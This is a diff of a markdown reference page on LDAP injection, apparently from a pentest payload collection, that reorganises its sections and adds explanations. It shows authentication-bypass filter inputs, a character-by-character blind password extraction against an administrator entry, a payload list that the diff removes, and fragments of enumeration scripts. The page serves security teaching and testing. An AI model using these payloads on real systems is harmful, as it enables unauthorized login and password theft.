@@ -6,20 +6,26 @@
 ## Summary
 
 * [Methodology](#methodology)
-* [Payloads](#payloads)
-* [Blind Exploitation](#blind-exploitation)
-* [Defaults attributes](#defaults-attributes)
-* [Exploiting userPassword attribute](#exploiting-userpassword-attribute)
+    * [Authentication Bypass](#authentication-bypass)
+    * [Blind Exploitation](#blind-exploitation)
+* [Defaults Attributes](#defaults-attributes)
+* [Exploiting userPassword Attribute](#exploiting-userpassword-attribute)
 * [Scripts](#scripts)
-    * [Discover valid LDAP fields](#discover-valid-ldap-fields)
-    * [Special blind LDAP injection](#special-blind-ldap-injection)
+    * [Discover Valid LDAP Fields](#discover-valid-ldap-fields)
+    * [Special Blind LDAP Injection](#special-blind-ldap-injection)
 * [Labs](#labs)
 * [References](#references)
 
 
 ## Methodology
 
-Example 1.
+LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping
+
+### Authentication Bypass
+
+Attempt to manipulate the filter logic by injecting always-true conditions.
+
+**Example 1**: This LDAP query exploits logical operators in the query structure to potentially bypass authentication
 
 ```sql
 user  = *)(uid=*))(|(uid=*
@@ -27,7 +33,7 @@ pass  = password
 query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
 ```
 
-Example 2
+**Example 2**: This LDAP query exploits logical operators in the query structure to potentially bypass authentication
 
 ```sql
 user  = admin)(!(&(1=0
@@ -35,34 +41,10 @@ pass  = q))
 query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
 ```
 
-## Payloads
 
-```text
-*
-*)(&
-*))%00
-)(cn=))\x00
-*()|%26'
-*()|&'
-*(|(mail=*))
-*(|(objectclass=*))
-*)(uid=*))(|(uid=*
-*/*
-*|
-/
-//
-//*
-@*
-|
-admin*
-admin*)((|userpassword=*)
-admin*)((|userPassword=*)
-x' or name()='username' or 'x'='y
-```
+### Blind Exploitation
 
-## Blind Exploitation
-
-We can extract using a bypass login
+This scenario demonstrates LDAP blind exploitation using a technique similar to binary search or character-based brute-forcing to discover sensitive information like passwords. It relies on the fact that LDAP filters respond differently to queries based on whether the conditions match or not, without directly revealing the actual password.
 
 ```sql
 (&(sn=administrator)(password=*))    : OK
@@ -82,8 +64,14 @@ We can extract using a bypass login
 (&(sn=administrator)(password=MYKE)) : OK
 ```
 
+**LDAP Filter Breakdown**
 
-## Defaults attributes
+* `&`: Logical AND operator, meaning all conditions inside must be true.
+* `(sn=administrator)`: Matches entries where the sn (surname) attribute is administrator.
+* `(password=X*)`: Matches entries where the password starts with X (case-sensitive). The asterisk (*) is a wildcard, representing any remaining characters.
+
+
+## Defaults Attributes
 
 Can be used in an injection like `*)(ATTRIBUTE_HERE=*`
 
@@ -100,7 +88,7 @@ commonName
 ```
 
 
-## Exploiting userPassword attribute
+## Exploiting userPassword Attribute
 
 `userPassword` attribute is not a string like the `cn` attribute for example but it’s an OCTET STRING
 In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).
@@ -115,7 +103,7 @@ userPassword:2.5.13.18:=\xx\xx\xx
 
 ## Scripts
 
-### Discover valid LDAP fields
+### Discover Valid LDAP Fields
 
 ```python
 #!/usr/bin/python3
@@ -136,7 +124,7 @@ for i in world:
 print(fields)
 ```
 
-### Special blind LDAP injection (without "*")
+### Special Blind LDAP Injection
 
 ```python
 #!/usr/bin/python3
@@ -174,7 +162,6 @@ flag = ''
   end
 end
 ```
-
 
 
 ## Labs
